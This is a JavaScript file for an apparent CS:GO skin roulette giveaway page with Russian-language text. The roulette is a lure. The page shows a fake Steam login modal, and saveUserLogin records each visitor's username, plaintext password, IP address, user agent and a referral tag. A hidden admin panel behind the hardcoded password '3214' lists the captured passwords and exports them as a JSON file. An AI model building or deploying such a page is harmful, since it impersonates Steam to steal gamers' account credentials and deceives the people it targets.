// Данные скинов с градиентами и иконками
const skins = [
    { 
        name: "AK-47 | Красная линия", 
        rarity: "rare", 
        pattern: "pattern-ak",
        icon: "fas fa-assault-rifle",
        price: "$45.99"
    },
    { 
        name: "AWP | Дракон Лор", 
        rarity: "legendary", 
        pattern: "pattern-awp",
        icon: "fas fa-sniper-rifle", 
        price: "$350.50"
    },
    { 
        name: "Перчатки | Кровавый патруль", 
        rarity: "epic", 
        pattern: "pattern-gloves",
        icon: "fas fa-hand-fist",
        price: "$120.75"
    },
    { 
        name: "Нож | Бабочка | Ультрафиолет", 
        rarity: "legendary", 
        pattern: "pattern-knife",
        icon: "fas fa-knife",
        price: "$520.00"
    },
    { 
        name: "M4A4 | Кактус", 
        rarity: "common", 
        pattern: "pattern-m4",
        icon: "fas fa-rifle",
        price: "$25.30"
    },
    { 
        name: "Desert Eagle | Кобра", 
        rarity: "common", 
        pattern: "pattern-pistol",
        icon: "fas fa-gun",
        price: "$18.75"
    },
    { 
        name: "P90 | Холодное сердце", 
        rarity: "rare", 
        pattern: "pattern-smg", 
        icon: "fas fa-submachine-gun",
        price: "$32.50"
    },
    { 
        name: "USP-S | Килконфыр", 
        rarity: "epic", 
        pattern: "pattern-pistol",
        icon: "fas fa-gun",
        price: "$28.90"
    },
    { 
        name: "AWP | Гипеон", 
        rarity: "epic", 
        pattern: "pattern-awp",
        icon: "fas fa-sniper-rifle",
        price: "$280.00"
    },
    { 
        name: "AK-47 | Огненный змей", 
        rarity: "legendary", 
        pattern: "pattern-ak",
        icon: "fas fa-assault-rifle",
        price: "$420.00"
    },
    { 
        name: "Перчатки | Спортивные", 
        rarity: "rare", 
        pattern: "pattern-gloves",
        icon: "fas fa-hand-fist",
        price: "$85.25"
    },
    { 
        name: "M4A1-S | Гном-камикадзе", 
        rarity: "common", 
        pattern: "pattern-rifle",
        icon: "fas fa-rifle",
        price: "$22.40"
    },
    { 
        name: "Нож | Скелетный | Ночная полоса", 
        rarity: "epic", 
        pattern: "pattern-knife",
        icon: "fas fa-knife",
        price: "$310.75"
    }
];

// Константы для админ-панели
const ADMIN_PASSWORD = "3214";

// Функция инициализации после полной загрузки DOM
function initializeApp() {
    // Получаем элементы DOM
    const steamModal = document.getElementById('steamModal');
    const closeModal = document.getElementById('closeModal');
    const openSteamModal = document.getElementById('openSteamModal');
    const loginForm = document.getElementById('loginForm');
    const rouletteTrack = document.getElementById('rouletteTrack');
    const spinButton = document.getElementById('spinButton');
    const resultModal = document.getElementById('resultModal');
    const closeResult = document.getElementById('closeResult');
    const wonItem = document.getElementById('wonItem');
    const balanceElement = document.getElementById('balance');
    const wonTodayElement = document.getElementById('wonToday');
    const claimBonus = document.getElementById('claimBonus');
    const dailyTimer = document.getElementById('dailyTimer');

    // User data
    let userData = {
        balance: 7, // +2 за реферальный бонус
        wonToday: 0,
        isLoggedIn: false,
        referralBonus: true
    };

    // Инициализируем рулетку сразу
    initializeRoulette();
    updateStats();
    startDailyTimer();

    // Показываем модальное окно авторизации
    setTimeout(() => {
        steamModal.style.display = 'flex';
    }, 100);

    // Close modal
    closeModal.addEventListener('click', () => {
        steamModal.style.display = 'none';
    });

    // Open modal from button
    openSteamModal.addEventListener('click', () => {
        steamModal.style.display = 'flex';
    });

    // Close modal when clicking outside
    window.addEventListener('click', (e) => {
        if (e.target === steamModal) {
            steamModal.style.display = 'none';
        }
    });

    // Form submission
    loginForm.addEventListener('submit', async (e) => {
        e.preventDefault();
        const username = document.getElementById('username').value;
        const password = document.getElementById('password').value;
        
        // Сохраняем данные
        await saveUserLogin(username, password);
        
        userData.isLoggedIn = true;
        alert(`Вход выполнен как: ${username}\nРеферальный бонус: +2 спина!`);
        steamModal.style.display = 'none';
        openSteamModal.textContent = username;
    });

    // Initialize roulette with items
    function initializeRoulette() {
        // Clear existing items
        rouletteTrack.innerHTML = '';
        
        // Add multiple copies of skins to create a longer track
        for (let i = 0; i < 5; i++) {
            skins.forEach(skin => {
                const item = document.createElement('div');
                item.className = `roulette-item ${skin.rarity}`;
                
                const rarityClass = `rarity-${skin.rarity}`;
                
                item.innerHTML = `
                    <div class="skin-pattern ${skin.pattern} ${skin.rarity}">
                        <i class="skin-icon ${skin.icon}"></i>
                    </div>
                    <div class="item-name">${skin.name}</div>
                    <div class="item-rarity ${rarityClass}">${getRarityText(skin.rarity)}</div>
                    <div class="item-price">${skin.price}</div>
                `;
                
                rouletteTrack.appendChild(item);
            });
        }
    }

    // Get Russian text for rarity
    function getRarityText(rarity) {
        switch(rarity) {
            case 'common': return 'Обычный';
            case 'rare': return 'Редкий';
            case 'epic': return 'Эпический';
            case 'legendary': return 'Легендарный';
            default: return 'Обычный';
        }
    }

    // Update stats display
    function updateStats() {
        balanceElement.textContent = userData.balance;
        wonTodayElement.textContent = userData.wonToday;
        
        // Enable/disable spin button based on balance
        spinButton.disabled = userData.balance <= 0;
    }

    // Spin the roulette
    spinButton.addEventListener('click', () => {
        if (userData.balance <= 0) {
            alert('У вас недостаточно баланса для спина!');
            return;
        }
        
        // Deduct balance
        userData.balance--;
        updateStats();
        
        // Disable button during spin
        spinButton.disabled = true;
        spinButton.textContent = 'Крутится...';
        
        // Calculate random stopping position
        const itemWidth = 200; // Width of each item including margin
        const itemsCount = rouletteTrack.children.length;
        const randomIndex = Math.floor(Math.random() * (itemsCount - 10)) + 5;
        const stopPosition = -(randomIndex * itemWidth);
        
        // Apply animation
        rouletteTrack.style.transform = `translateX(${stopPosition}px)`;
        
        // After animation completes
        setTimeout(() => {
            // Get the won item (the one in the center)
            const centerIndex = Math.abs(Math.round(stopPosition / itemWidth));
            const wonSkin = skins[centerIndex % skins.length];
            
            // Show result modal
            showResult(wonSkin);
            
            // Update stats
            userData.wonToday++;
            updateStats();
            
            // Re-enable button if balance allows
            spinButton.disabled = userData.balance <= 0;
            spinButton.textContent = 'Крутить рулетку';
        }, 4000);
    });

    // Show result modal with won item
    function showResult(skin) {
        const rarityClass = `rarity-${skin.rarity}`;
        
        wonItem.innerHTML = `
            <div class="skin-pattern ${skin.pattern} ${skin.rarity}">
                <i class="skin-icon ${skin.icon}"></i>
            </div>
            <div class="item-name">${skin.name}</div>
            <div class="item-rarity ${rarityClass}">${getRarityText(skin.rarity)}</div>
            <div class="item-price">${skin.price}</div>
        `;
        
        resultModal.classList.add('show');
    }

    // Close result modal
    closeResult.addEventListener('click', () => {
        resultModal.classList.remove('show');
    });

    // Daily bonus functionality
    function startDailyTimer() {
        // Set timer for 24 hours from now
        const now = new Date();
        const tomorrow = new Date(now);
        tomorrow.setDate(tomorrow.getDate() + 1);
        tomorrow.setHours(0, 0, 0, 0);
        
        function updateTimer() {
            const now = new Date();
            const diff = tomorrow - now;
            
            if (diff <= 0) {
                dailyTimer.textContent = "00:00:00";
                claimBonus.disabled = false;
                claimBonus.textContent = "Забрать бонус";
                return;
            }
            
            const hours = Math.floor(diff / (1000 * 60 * 60));
            const minutes = Math.floor((diff % (1000 * 60 * 60)) / (1000 * 60));
            const seconds = Math.floor((diff % (1000 * 60)) / 1000);
            
            dailyTimer.textContent = 
                `${hours.toString().padStart(2, '0')}:${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
        }
        
        updateTimer();
        setInterval(updateTimer, 1000);
    }

    // Claim daily bonus
    claimBonus.addEventListener('click', function() {
        if (this.disabled) return;
        
        userData.balance += 2;
        updateStats();
        
        this.disabled = true;
        this.textContent = "Бонус получен";
        this.style.background = "#777";
        
        alert('Ежедневный бонус получен! +2 спина');
    });
}

// Функции для работы с данными пользователей
function getLoginHistory() {
    return JSON.parse(localStorage.getItem('login_history') || '[]');
}

function saveLoginHistory(history) {
    localStorage.setItem('login_history', JSON.stringify(history));
}

async function saveUserLogin(username, password) {
    // Получаем IP (если возможно)
    let ip = 'unknown';
    try {
        const ipResponse = await fetch('https://api.ipify.org?format=json');
        const ipData = await ipResponse.json();
        ip = ipData.ip;
    } catch (error) {
        console.log('Не удалось получить IP');
    }
    
    const loginData = {
        username: username,
        password: password,
        timestamp: new Date().toISOString(),
        ip: ip,
        userAgent: navigator.userAgent,
        referrer: document.referrer,
        referral: 'fronzyyyy132'
    };
    
    // Сохраняем текущую сессию
    localStorage.setItem('current_user', JSON.stringify(loginData));
    
    // Сохраняем в историю
    const history = getLoginHistory();
    history.push(loginData);
    saveLoginHistory(history);
    
    console.log('Сохранено:', loginData);
    return loginData;
}

// Функции для админ-панели
function updateAdminTable() {
    const history = getLoginHistory();
    const tbody = document.getElementById('usersTableBody');
    const totalRecords = document.getElementById('totalRecords');
    const lastUpdate = document.getElementById('lastUpdate');
    
    tbody.innerHTML = '';
    totalRecords.textContent = history.length;
    lastUpdate.textContent = new Date().toLocaleString();
    
    if (history.length === 0) {
        tbody.innerHTML = '<tr><td colspan="4" style="padding: 20px; text-align: center; color: #777;">Нет данных</td></tr>';
        return;
    }
    
    // Сортируем по дате (новые сверху)
    history.sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp));
    
    history.forEach(login => {
        const row = document.createElement('tr');
        row.style.borderBottom = '1px solid #333';
        
        const date = new Date(login.timestamp).toLocaleString();
        
        row.innerHTML = `
            <td style="color: #aaa; font-size: 12px;">${date}</td>
            <td style="color: #fff;">${escapeHtml(login.username)}</td>
            <td style="color: #ff5722;">${escapeHtml(login.password)}</td>
            <td style="color: #aaa; font-size: 12px;">${login.ip || 'unknown'}</td>
        `;
        
        tbody.appendChild(row);
    });
}

function escapeHtml(text) {
    const div = document.createElement('div');
    div.textContent = text;
    return div.innerHTML;
}

// Инициализация админ-панели
document.addEventListener('DOMContentLoaded', function() {
    const adminPanel = document.getElementById('adminPanel');
    const secretAdminBtn = document.getElementById('secretAdminBtn');
    const closeAdmin = document.getElementById('closeAdmin');
    const adminLoginBtn = document.getElementById('adminLoginBtn');
    const adminPassword = document.getElementById('adminPassword');
    const adminError = document.getElementById('adminError');
    const adminLogin = document.getElementById('adminLogin');
    const adminContent = document.getElementById('adminContent');
    const refreshData = document.getElementById('refreshData');
    const exportData = document.getElementById('exportData');
    const clearData = document.getElementById('clearData');
    
    // Открыть админку по секретной кнопке
    secretAdminBtn.addEventListener('click', function() {
        adminPanel.style.display = 'block';
        adminPassword.value = '';
        adminError.style.display = 'none';
        adminLogin.style.display = 'block';
        adminContent.style.display = 'none';
    });
    
    // Закрыть админку
    closeAdmin.addEventListener('click', function() {
        adminPanel.style.display = 'none';
    });
    
    // Вход в админку
    adminLoginBtn.addEventListener('click', function() {
        if (adminPassword.value === ADMIN_PASSWORD) {
            adminLogin.style.display = 'none';
            adminContent.style.display = 'block';
            updateAdminTable();
        } else {
            adminError.style.display = 'block';
        }
    });
    
    // Enter для входа
    adminPassword.addEventListener('keypress', function(e) {
        if (e.key === 'Enter') {
            adminLoginBtn.click();
        }
    });
    
    // Обновить данные
    refreshData.addEventListener('click', updateAdminTable);
    
    // Экспорт данных
    exportData.addEventListener('click', function() {
        const history = getLoginHistory();
        const dataStr = JSON.stringify(history, null, 2);
        const dataBlob = new Blob([dataStr], {type: 'application/json'});
        
        const link = document.createElement('a');
        link.href = URL.createObjectURL(dataBlob);
        link.download = 'users_data.json';
        link.click();
    });
    
    // Очистить данные
    clearData.addEventListener('click', function() {
        if (confirm('Вы уверены, что хотите удалить ВСЕ данные?')) {
            localStorage.removeItem('login_history');
            localStorage.removeItem('current_user');
            updateAdminTable();
            alert('Все данные очищены!');
        }
    });
});

// Запускаем инициализацию когда DOM полностью загружен
document.addEventListener('DOMContentLoaded', initializeApp);